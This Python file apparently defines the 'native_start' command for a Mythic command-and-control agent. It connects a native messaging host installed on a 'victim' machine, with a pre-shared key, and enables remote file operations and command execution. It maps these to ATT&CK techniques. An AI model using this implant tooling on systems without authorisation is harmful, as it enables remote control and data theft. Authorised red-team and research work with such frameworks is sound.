from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class NativeStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="psk",
                display_name="Pre-Shared Key",
                type=ParameterType.String,
                description=(
                    "PSK shown in the Mythic build output after payload generation. "
                    "Required to authenticate with the native host."
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                self.add_arg("psk", self.command_line.strip())


class NativeStartCommand(CommandBase):
    cmd            = "native_start"
    needs_admin    = False
    help_cmd       = "native_start psk=<key-from-build-output>"
    description    = (
        "Connect the Python native messaging host without starting the SOCKS proxy bridge. "
        "Enables file_ls, file_download, file_upload, file_delete, file_mkdir, and exec "
        "on payloads built with exec_only, files_only, or files_and_exec native_host_features. "
        "Use ip_proxy_start instead if you also need SOCKS proxying.\n\n"
        "Prerequisites: native host installed on victim — "
        "python3 native_host/install.py --extension-id <ext-id>"
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = NativeStartArguments
    attackmapping  = ["T1059", "T1005", "T1083"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        psk = task.args.get_arg("psk") or ""
        task.display_params = "psk=****" if psk else "(no psk)"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
